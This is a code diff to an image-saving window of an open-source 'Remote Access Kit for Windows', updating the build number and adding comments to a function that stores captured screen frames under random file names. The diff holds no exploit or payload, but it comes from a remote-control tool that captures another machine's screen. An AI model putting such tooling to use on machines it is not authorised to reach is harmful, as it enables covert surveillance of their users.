@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.21
+# Build:  1.0.22
 # -------------------------------------------------------------
 import os
 
@@ -32,10 +32,10 @@ class Ui_image_data_window(object):
 
     #Function will save a file to the image_data directory with a random string for the name
     def save_raw_file(self):
-        file_path = f'{ClientPath().image_data_dir}{Scrambler().scrambleVar(7)}.jpg'
-        original_image_data = LoggingUtilitys().receive_file_bytes(DSFilePath().streaming_frame)
-        LoggingUtilitys().write_bytes_to_file(file_path,original_image_data)
-        Notifications().raise_notification(
+        file_path = f'{ClientPath().image_data_dir}{Scrambler().scrambleVar(7)}.jpg'                #Create local file path string with random string for file name
+        original_image_data = LoggingUtilitys().receive_file_bytes(DSFilePath().streaming_frame)    #Retrieve the bytes of the original image
+        LoggingUtilitys().write_bytes_to_file(file_path,original_image_data)                        #Write those bytes to a new file and save it
+        Notifications().raise_notification(                                                         #Notify the user with the name of the screenshot
             f'Saved file as {file_path}',
             'Success'
         )
